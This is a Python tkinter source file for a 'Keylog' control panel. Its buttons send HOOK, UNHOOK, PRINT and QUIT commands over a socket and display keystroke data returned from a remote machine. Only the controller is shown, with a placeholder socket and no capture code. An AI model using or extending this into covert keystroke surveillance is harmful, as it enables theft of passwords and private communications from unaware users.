import tkinter as tk
import threading

class KeylogForm:
    def __init__(self, client):
        self.client = client

        self.root = tk.Tk()
        self.root.title("Keylog")

        self.butHook = tk.Button(self.root, text="Hook", command=self.butHook_Click)
        self.butHook.pack()

        self.butUnhook = tk.Button(self.root, text="Unhook", command=self.butUnhook_Click)
        self.butUnhook.pack()

        self.butPrint = tk.Button(self.root, text="Print", command=self.butPrint_Click)
        self.butPrint.pack()

        self.butClear = tk.Button(self.root, text="Clear", command=self.butClear_Click)
        self.butClear.pack()

        self.txtKQ = tk.Text(self.root, wrap=tk.WORD, height=10, width=50)
        self.txtKQ.pack()

        self.root.protocol("WM_DELETE_WINDOW", self.form_closing)

    def start(self):
        self.root.mainloop()

    def butHook_Click(self):
        self.send_message("HOOK")

    def butUnhook_Click(self):
        self.send_message("UNHOOK")

    def butPrint_Click(self):
        self.send_message("PRINT")
        data = self.receive_data(5000)
        self.txtKQ.insert(tk.END, data)

    def butClear_Click(self):
        self.txtKQ.delete("1.0", tk.END)

    def form_closing(self):
        self.send_message("QUIT")
        self.root.destroy()

    def send_message(self, message):
        if self.client:
            self.client.sendall(message.encode())

    def receive_data(self, size):
        data = b""
        while len(data) < size:
            try:
                chunk = self.client.recv(size - len(data))
                if not chunk:
                    break
                data += chunk
            except:
                break
        return data.decode()

if __name__ == "__main__":
    client = None  # Replace this with your actual client socket object
    keylog_form = KeylogForm(client)
    keylog_form.start()
